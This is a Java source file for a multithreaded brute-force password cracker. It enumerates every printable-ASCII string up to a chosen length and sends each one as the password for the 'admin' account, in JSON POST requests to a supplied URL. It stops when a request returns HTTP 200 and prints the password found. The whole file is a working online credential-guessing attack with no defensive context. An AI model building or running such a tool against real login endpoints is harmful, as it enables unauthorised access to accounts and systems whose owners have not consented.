package org.example;

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.time.LocalTime;
import java.time.temporal.ChronoUnit;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.LinkedBlockingQueue;

public class BlockingQueueHttpPwCracker implements PwCracker {


    private final HttpClient httpClient;
    private final BlockingQueue<String> queue;

    public BlockingQueueHttpPwCracker() {
        this.httpClient = HttpClient.newHttpClient();
        this.queue = new LinkedBlockingQueue<>();
    }

    private String recursiveCombinationFinder(BlockingQueue<String> queue, int maxLength, int currentLength, byte[] currentPassword) {
        if (currentLength == maxLength) {
            try {
                queue.put(new String(currentPassword));
            } catch (InterruptedException e) {
                throw new RuntimeException(e);
            }

            return null;
        }

        for (int i = 33; i < 126; i++) {
            currentPassword[currentLength] = (byte) i;
            String result = recursiveCombinationFinder(queue, maxLength, currentLength + 1, currentPassword);
            if (result != null) {
                return result;
            }
        }

        return null;
    }



    public String crack(int maxLength, String url) {

        int numberOfCores = Runtime.getRuntime().availableProcessors();
        ExecutorService executor = Executors.newFixedThreadPool(numberOfCores - 1);

        executor.submit(() -> {
            for (int length = 1; length <= maxLength; length++) {
                byte[] passwordBytes = new byte[length];
                recursiveCombinationFinder(queue, length, 0, passwordBytes);
            }
            return "Not found";
        });

        for (int i = 0; i < numberOfCores; i++) {

            executor.submit(() -> {
                LocalTime start = LocalTime.now();
                String passWordToTry;
                while(true) {
                    try {
                        passWordToTry = queue.take();
                        HttpRequest request = HttpRequest.newBuilder()
                                .uri(new URI(url))
                                .headers("Content-Type", "application/json;charset=UTF-8")
                                .POST(HttpRequest.BodyPublishers.ofString("{\"username\":\"admin\",\"password\":\"" + passWordToTry + "\"}"))
                                .build();
                        HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());
                        if (response.statusCode() == 200) {
                            System.out.println("Password found: " + passWordToTry);
                            System.out.println("Time taken: " + start.until(LocalTime.now(), ChronoUnit.SECONDS) + " seconds");
                            executor.shutdownNow();
                            return passWordToTry;
                        }
                    } catch (Exception e) {
                        throw new RuntimeException(e);
                    }
                }

            });
        }





        return null;
    }
}
